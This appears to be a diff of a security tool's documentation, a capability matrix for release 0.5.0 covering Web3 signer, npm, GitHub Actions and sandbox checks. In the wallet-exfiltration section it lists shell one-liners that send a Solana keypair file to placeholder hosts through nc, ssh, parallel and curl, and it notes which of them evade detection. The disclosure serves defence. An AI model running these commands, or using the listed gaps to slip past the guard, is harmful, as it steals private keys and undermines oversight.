@@ -33,7 +33,7 @@ tirith trivially. Nothing in this stack changes that; see
 [threat model](threat-model.md).
 
 **"None" is never softened into "planned".** A None cell means the capability is
-absent from this branch, not that it is coming.
+absent from 0.5.0, not that it is coming.
 
 ## The matrix
 
@@ -45,7 +45,7 @@ absent from this branch, not that it is coming.
 | On-chain write / signer / endpoint findings | Full | Full | Partial | None | None | none |
 | `web3_guard` trusted policy | Partial (bounded grammar and static context) | Full for resolved policy facts | Partial | None | None | Incomplete analysis and unbound external execution remain explicit; required exact cards may be unavailable |
 | Wallet, key, seed, and keystore recognition | Full for the declared formats | Full | Partial | None | None (recognition drives mandatory redaction, which is not an attestation) | none |
-| Wallet source-to-sink exfiltration | Partial | Partial | Partial | None | None | see the nested-body gap below |
+| Wallet source-to-sink exfiltration | Partial | Partial | Partial | None | None | see the staged-file, ssh and `parallel -a` gaps below |
 | Exact Web3 command-card bindings | Partial | Partial (required cards are enforced) | Partial | None | Partial (signed binding, not execution evidence) | Unbound executable identity, incomplete facts and unavailable artifact execution rechecks refuse approval; schema-1 cards cannot authorize Web3 |
 
 ### Untrusted task boundary
@@ -61,7 +61,7 @@ absent from this branch, not that it is coming.
 | Capability | Detection | Preflight decision | Execution enforcement | Containment | Attestation | Unsupported |
 |---|---|---|---|---|---|---|
 | npm command grammar and registry identity facts | Full for the declared grammar | Full | Partial | None | None | no tarball bytes are ever fetched, hashed, or bound |
-| npm signature and provenance receipt | Partial (npm's own answer, parsed) | None (explicit command, not a gate) | None | None | Full for the receipt document | Windows (`npm.cmd` is refused); npm outside the contract table; a project `.npmrc` that reconfigures the audit |
+| npm signature and provenance receipt | Partial (npm's own answer, parsed) | None (explicit command, not a gate) | None | None | Full for the receipt document | Windows (`npm.cmd` is refused); npm outside the contract table; a project `.npmrc` with any setting |
 | GitHub Actions artifact flow | Full for the modelled surface | Full | None (a scanner finding, not a gate) | None | None | only directory scans run the post-pass: `tirith check` on one file, `tirith_scan_file`, and the LSP do not |
 
 ### Untrusted projects and browsers
@@ -84,7 +84,7 @@ absent from this branch, not that it is coming.
 |---|---|---|---|---|---|---|
 | Byte-based content dispatch and global output bounds | Full | Full | Partial | None | None | nested and self-extracting archive content is a declared gap |
 | PDF hidden-instruction and confirmation-suppression analysis | Partial | Full | Partial | None | None | unsupported colour spaces and renderer cases record incompleteness |
-| ThreatDB publication correctness | Full for the compiled sources | Full | Partial | None | Partial (the database is signed and sequence-ordered) | no new feed and no new database format is enabled by this branch |
+| ThreatDB publication correctness | Full for the compiled sources | Full | Partial | None | Partial (the database is signed and sequence-ordered) | no new feed and no new database format is enabled in 0.5.0 |
 
 ## Why each cell says what it says
 
@@ -92,7 +92,7 @@ absent from this branch, not that it is coming.
 
 `crates/tirith-core/src/rules/web3/` parses Cast, Forge, Hardhat, Solana, and
 Anchor invocations into typed facts. It runs from
-`crates/tirith-core/src/engine.rs:3067`, so every surface built on the engine
+`crates/tirith-core/src/engine.rs:4002-4025`, so every surface built on the engine
 (`tirith check`, the shell hook, `tirith_check_command`, the gateway) sees it.
 
 Detection is **Full for the declared grammar** and nothing wider. `forge create`,
@@ -114,13 +114,13 @@ Three rule ids, all in `crates/tirith-core/src/rules/web3_gate.rs`:
 `web3_network_policy_violation`.
 
 The severity ladder is grammar-driven, not heuristic
-(`web3_gate.rs:185-231`, `234-283`): a state-changing operation is Medium,
+(`web3_gate.rs:425-472`, `474-525`): a state-changing operation is Medium,
 rising to High only when the same command also disables a declared safety
 control (`--skip-simulation`, `--skip-preflight`, `--force`); literal raw signer
 material in argv is Critical; an unlocked node or an interactive prompt is High.
 An operation explicitly aimed at `devnet`, `testnet`, `localhost`, `localnet`,
 or a loopback endpoint produces no state-change finding at all
-(`web3_gate.rs:129-171`), because deploying to devnet is routine and warning on
+(`web3_gate.rs:384-401`, `429-434`), because deploying to devnet is routine and warning on
 it is how a control gets ignored.
 
 Evidence is categorical. A finding names the tool, the operation, and the signer
@@ -142,10 +142,10 @@ and modes take the stricter value on a total lattice. A property test proves
 `allowed_effects(merge(trusted, hostile_repo))` is always a subset of
 `allowed_effects(trusted)`.
 
-The defaults are observational (`web3_policy.rs:236-253`): no networks, no
+The defaults are observational (`web3_policy.rs:252-269`): no networks, no
 signers, no denials, and every action at `warn`. With no trusted networks
 declared, the unclassified-endpoint path does not fire at all
-(`web3_gate.rs:315`), so a fresh installation gains no new warnings from this
+(`web3_gate.rs:543`), so a fresh installation gains no new warnings from this
 section.
 
 An endpoint no trusted network claims is reported through
@@ -200,20 +200,23 @@ promotion, HTTPie and `xh`, `scp`, `rsync`, `rclone`, the netcat family,
 source-only read stays below confirmed exfiltration; an unresolvable path fails
 closed as `analysis_incomplete` rather than as a confident allow.
 
-What does not work, verified on the built binary at this branch tip:
+What does not work, verified on the 0.5.0 binary with the default policy:
 
 ```
-bash -c "cat ~/.config/solana/id.json" | curl --data-binary @- https://collector.invalid/upload
+cat ~/.config/solana/id.json > x; nc collector.invalid 9000 < x
+cat ~/.config/solana/id.json | ssh host.invalid 'cat > k'
+parallel -a ~/.config/solana/id.json curl https://collector.invalid/upload -d
 ```
 
-is a confident **allow**. The nested body IS analyzed, so the same chain
-entirely inside `-c` blocks correctly, and the same chain entirely outside `-c`
-blocks correctly. What escapes is the sink-outside / producer-inside
-arrangement: the inner body's read provenance is not propagated to the outer
-pipeline's dataflow. Related unprobed shapes are `xargs -a <file>`,
-`parallel -a <file>`, and `while read` loops. Fixing this needs nested-body read
-provenance threaded through the dataflow loop, which is a behaviour change and
-therefore a future slice, not a documentation slice.
+Each is a confident **allow**. A secret staged in a file and sent by a later
+input redirection is not followed, a secret piped into an ssh remote command
+is not detected, and `parallel -a <file>` is not detected. The sink-outside /
+producer-inside arrangement is detected in 0.5.0:
+`bash -c "cat ~/.config/solana/id.json" | curl --data-binary @- https://collector.invalid/upload`
+blocks as `data_exfiltration`, as does the same chain entirely inside `-c` and
+entirely outside it. `xargs -a <file>` and a `while read` loop over a sensitive
+file block as `analysis_incomplete`. Closing the remaining gaps is a behaviour
+change and therefore a future slice, not a documentation slice.
 
 ### Exact Web3 command-card bindings
 
@@ -243,7 +246,7 @@ ingress adapter. `SourceKind::is_trusted` is unconditionally `false`
 (`SourceKind::is_trusted` in `task.rs`) for every source kind including repository config, because
 repository config is exactly what a malicious pull request edits.
 
-Verified live at this branch tip: an envelope whose source claims `agent_config`,
+In 0.5.0 (pinned by tests): an envelope whose source claims `agent_config`,
 submitted through the `github-issue` adapter, resolves to
 `"effective_source": "issue_body"`.
 
@@ -267,7 +270,7 @@ visible in their own output rather than only in prose. Execution enforcement is
 
 The MCP tool is preview-gated. `tirith_check_task` is absent from the frozen
 default `tools/list` and is refused BY NAME unless `TIRITH_MCP_PREVIEW=1` is set
-(`crates/tirith-core/src/mcp/tools.rs:174-181`, `332-335`). See
+(`crates/tirith-core/src/mcp/tools.rs:170-182`, `428-433`). See
 [compatibility](compatibility.md) for why the default list cannot simply grow a
 tool.
 
@@ -389,8 +392,8 @@ control, and it is broader than its name suggests.
 ### npm command grammar and registry identity facts
 
 `crates/tirith-core/src/npm_command.rs` is one grammar replacing four divergent
-private copies. It covers the `npm`, `npx`, `pnpm`, `yarn`, `bun`, and `bunx`
-launchers (`npm_command.rs:81-108`), including `dlx`, `exec`, `ci`, and the
+private copies. It covers the `npm`, `npx`, `pnpm`, `pnpx`, `yarn`, `bun`, and
+`bunx` launchers (`npm_command.rs:78-89`), including `dlx`, `exec`, `ci`, and the
 common install misspellings, and it distinguishes `pnpm exec` (local binary)
 from `pnpm dlx` (fetch and run).
 
@@ -410,7 +413,7 @@ it requires a newer Rust than the workspace MSRV.
 
 **Tirith does not download, inspect, or bind the tarball bytes npm installs.**
 There is nothing local for the SRI to cover, so no binding is attempted. This is
-not an npm firewall and this branch does not build toward one: there is no npm
+not an npm firewall and 0.5.0 does not build toward one: there is no npm
 quarantine, no npm install transaction, and no npm rollback.
 
 ### npm signature and provenance receipt
@@ -429,11 +432,12 @@ over different bytes than the lockfile will install.
 
 Two consequences an operator meets in practice. A non-public registry is
 `partial` rather than clean, because npm ships the Sigstore TUF root that pins
-only `registry.npmjs.org`. And a project `.npmrc` that sets a key deciding what
-npm verifies or where it verifies it from (`registry`, `ca`, `cafile`,
-`strict-ssl`, `_keys`, `omit`, `userconfig`, `globalconfig`) returns `partial`
-and runs NO audit command: the audited project does not get to configure its own
-audit.
+only `registry.npmjs.org`. And a project `.npmrc` that sets any key at all
+returns `partial` (`project_npmrc_override`) and runs NO audit command. Only
+blank lines and `#` or `;` comments are ignored. Tirith does not keep a list of
+audit-affecting keys such as `registry`, `cafile`, `strict-ssl`, `_keys` or
+`omit`, because npm can add new ones: the audited project does not get to
+configure its own audit.
 
 ### GitHub Actions artifact flow
 
@@ -449,19 +453,19 @@ The presence-level `WorkflowRunTrigger` finding is downgraded from High to
 Medium only for consumers the post-pass had COMPLETE visibility into and proved
 no chain for.
 
-The post-pass runs inside `scan::scan` (`crates/tirith-core/src/scan.rs:254`,
-invoking it at `:436`), so it runs on **every** directory-scan caller, not only
+The post-pass runs inside `scan::scan` (`crates/tirith-core/src/scan.rs:276`,
+invoking it at `:462`), so it runs on **every** directory-scan caller, not only
 the CLI. Those callers are `tirith scan` (`crates/tirith/src/cli/scan.rs:248`),
 the `tirith_scan_directory` MCP tool
-(`crates/tirith-core/src/mcp/tools.rs:742`), and both MCP scan resources
-(`crates/tirith-core/src/mcp/resources.rs:153` and `:244`). An agent gating on
+(`crates/tirith-core/src/mcp/tools.rs:862`), and both MCP scan resources
+(`crates/tirith-core/src/mcp/resources.rs:154` and `:254`). An agent gating on
 `tirith_scan_directory` therefore sees the same downgraded Medium and the same
 `WorkflowArtifactPoisoning` chain findings the CLI produces, and does not need
 to re-run the CLI to get them.
 
 What genuinely never runs the post-pass, and therefore keeps the original
 severity, is per-file analysis: `tirith check` on a single workflow file, the
-`tirith_scan_file` MCP tool (`mcp/tools.rs:657`, via
+`tirith_scan_file` MCP tool (`mcp/tools.rs:774`, via
 `scan_single_file_guarded`), and the LSP.
 
 Execution enforcement is **None**. This is a scanner finding. It can gate a
@@ -481,8 +485,7 @@ Linux architectures; macOS cannot enforce a
 per-process memory ceiling or a process-count ceiling at all; and the
 parent-owned wall-clock and combined-output supervisor is Linux-only.
 
-Verified live on the macOS development host against the current integration
-candidate: the command
+On a macOS host in 0.5.0 the command
 refuses before anything is copied or spawned, exits 1, writes a refusal receipt,
 reports `project_copy_materialized: false`, and names the exact missing control
 ("missing: resource_limits ... the parent-owned wall-clock and combined-output
@@ -564,7 +567,7 @@ Neither receipt is anchored in the audit hash chain, for the same
 operator-chosen-path reason as the browser baseline. `BuildCoverage::audit_chain_anchored`
 is always `false` and `validate` refuses a receipt that claims otherwise.
 
-## What this branch does not do
+## What 0.5.0 does not do
 
 Named explicitly so no reader has to infer it from silence.
 
@@ -578,7 +581,7 @@ Named explicitly so no reader has to infer it from silence.
   both npm and Python on every host pending private-input execution qualification.
 - **No browser forensics.** No browsing data is read, no browser is monitored,
   nothing is quarantined or removed, and no infostealer is attributed.
-- **No reproducible builds.** No receipt in this branch claims that an output
+- **No reproducible builds.** No receipt in 0.5.0 claims that an output
   was produced from a source, and none can.
 - **No universal enforcement.** Enforcement exists at nine tirith-owned
   transitions and in a shell hook that must be installed, interactive, and in a
